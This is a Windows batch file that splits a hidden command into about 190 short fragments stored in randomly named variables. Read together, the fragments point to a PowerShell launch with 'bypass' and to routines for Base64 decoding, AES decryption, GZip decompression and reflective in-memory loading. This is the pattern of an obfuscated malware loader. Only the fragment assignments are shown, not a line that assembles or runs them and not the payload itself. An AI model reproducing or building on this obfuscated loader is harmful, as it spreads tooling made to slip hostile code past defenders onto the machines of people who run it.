@echo off
set "AMLphDojnO=:\"
set "oafxHICWHX=we"
set "nWiRzfkGUF=\v"
set "xQBuQAbaGp=Wi"
set "walEiEICKp=ow"
set "SyqqceenfC=em"
set "sLZjEzGZci=he"
set "wDbcuoVqBe= /"
set "fkECHqHlSQ=in"
set "vAgEAKXElv=rs"
set "mDLfaKhQOA=s\"
set "JBHYKyzqJx=32"
set "ChEPdwxCWY=ll"
set "jgVTGRWQBR=rS"
set "GhAzHKkMcT=do"
set "APETBBwpdU=.e"
set "QnyTRdCbNu=we"
set "ADazruiwiI=co"
set "IPsgnQrvyA=nd"
set "NgvIcJPuWX=ll"
set "cCTEEwChKz=po"
set "kcAueuTYNE=\W"
set "tYPXDZlYUE=he"
set "PXBUVKuFbq=Sy"
set "mvInVDtWwb=y "
set "lSKNswEXml=st"
set "BfDzbfopor=1."
set "lgAAwyWeqt=Po"
set "BJlEbRYhkD= C"
set "rtSRSANYTy=py"
set "XonOaPYVmI=ws"
set "yYWofqkhTI=xe"
set "wCZEGdLmQW=0\"
set "yYhLpVXvLf= %~dp0"
set "FPiboMFIka=cd"
set "REttyXVsiS=grap"
set "dGlPPLecmI=ne);"
set "wHhptKHZwJ=();$"
set "vWjBciKahB=ecry"
set "mannKnIywB=zuZI"
set "CTkDmBcUdE=PKCS"
set "wIVvlVCeTY=ose("
set "fJcDxiOCnM=qKWy"
set "DdHYLjXIAh=vc ="
set "OjqjHgoXxg=]::("
set "VgRPIQDQqT=rity"
set "rWdCsYsXba=Fina"
set "csqckQLXLL=.Mod"
set "KgEUeXBSou=ment"
set "GFRcrLoCcF=  $k"
set "oNgKvBIJjr=nirt"
set "vEHQQFixom=ach "
set "nYdvnSDVIb=yTo("
set "otdMUxBobD=.Key"
set "ljIiJYwgof=-4] "
set "WLynhydHDK=BC;$"
set "MxHVhoWtCk=snMV"
set "fpRMvFrgBm=]::("
set "FDZAOJEnER= if "
set "YTHRkJWgtc=;$UT"
set "zhgJsIBJgx=PxDc"
set "xFjceHOhWR=oin "
set "IrPOQgypSC=$SQM"
set "hbPNsZJvFa=);$O"
set "OjfgWraGZd=raph"
set "NCjmSoxZJh=xDcf"
set "cBRkKCYdPj=m.Re"
set "IjlootGikz=lit("
set "ahtOiwDJSO=rt]:"
set "wFMcSFUadl=::('"
set "luPEtnYmvr=morF"
set "egNXjaQmtu=lBlo"
set "lCzXjwoCaN=Ei);"
set "XtRmjHDmeX=)($P"
set "OybXOVSXds=.Mem"
set "EtKeZZhLzk=m(, "
set "CYIUOxkzdW=ress"
set "vMXrkRFimc=yste"
set "behpDAmsPG=tS46"
set "mdToWvvebA=Disp"
set "ZzlryzxjcE=flec"
set "vincrhQFkZ=m.IO"
set "qbOfzphIKQ=ing("
set "hAetJSuiij=fore"
set "uWNkmEVIZM=f = "
set "FeDBYlYSHn=('%*'"
set "khVbRtmvIj=3); "
set "ZTehNogkBw=[]] "
set "mLHKIVdRpf=ode]"
set "sFeSufCOBn=e = "
set "THFtYQUCbf=esMa"
set "IjHOSmWhUo=pose"
set "NGGOwyYkYQ=New-"
set "yRqlBJCfpU=106u"
set "UdBUGcRpqh=bjec"
set "TOIhrgdMqm=Disp"
set "HQyItMpZXv=iron"
set "EXmpdDLBrl=yste"
set "CXKYRkDGPq=('Tg"
set "dBRCybuXeX=oJEi"
set "RqVxTibsLz=-joi"
set "BILeHswKaS=TllA"
set "UMPSXkZZuI=snMV"
set "JZjzHnaJsH=orF'"
set "WskqaMfZJB=y.Ci"
set "ZaBMKXEWyD=Secu"
set "HErEJDwBVM=nage"
set "ipmaNKzfmQ=ispo"
set "geSnxpvqBP=$goJ"
set "jgemKrSHFs=cf ="
set "RizqmJMcNC=ddin"
set "SflmcHbwPr=dj0C"
set "wqZZZJZsKn=ci.D"
set "sBjgkConHV=onve"
set "dAwWIPKGCj=;$wN"
set "FIrSpfYAIp=em.C"
set "AQdYnrqrzM=Gba."
set "oXpRsjNzHq=PTtG"
set "oTKDrIwesY=);$G"
set "pQFWwquUXE=ect "
set "DUKAiPnFhK=rans"
set "nQQTwjxoth=gsYZ"
set "RVHzARmFeJ=RyQ "
set "ZrYNuhSQiM= '')"
set "KnCstZmHaf=mJci"
set "nMHudhgYRM=c) {"
set "NFFFxOGwNm=:: '"
set "vlFMpQOovM=[IO."
set "wMIadrohrV=F'[-"
set "TLEvxsGQSp=esaB"
set "TcqQAUiuaI=sion"
set "GZRZzpjElD=ptor"
set "UBNCjugPmr=$KQG"
set "AGRlnbPZDV=ew-O"
set "OjIrlyAymQ=($qK"
set "ZvmRxoHXxS=Secu"
set "cwimODDKNi= = N"
set "AyyyGWgTEK=.Dis"
set "JSVixxgvvi=$oZq"
set "vGSwiojPod=i = "
set "QNtTsjdAHS=gth)"
set "PhqJyQHVSK=form"
set "lqXomtpXWx=stem"
set "BZRSoApbBY==');"
set "lYuCBesBcG=eH, "
set "thQRwEDHcX=Obje"
set "rZYnvsKmLH=bypa"
set "eavfvckVgl=.GZi"
set "suybeyLpUK=PxDc"
set "HIMakYaxad=th('"
set "OdMRpeLAnG= [st"
set "avBxDQpCai=, $P"
set "qITkUxmiTG=ion."
set "fGeOErxxvA=;$KQ"
set "tolgKIkWQp=eam("
set "evlgbbIiJC=PxEW"
set "NUsSDbMtWR=ypto"
set "MJExBqHhge=CFxo"
set "LaPupLQpws=();$"
set "rYgUkLcpoQ=OsnM"
set "KEWFGLzfdN=1] -"
set "bmqmhVzRie=.Cry"
set "DnYIfttXSH='')("
set "CoJEwyyhsC=::De"
set "EcAnmFyZex=n ''"
set "VWEyKRVHMs=.Dis"
set "sjitnmoOaO= = ["
set "vVRWTfXVLT=.Cre"
set "oBrMISdzVG=e]::"
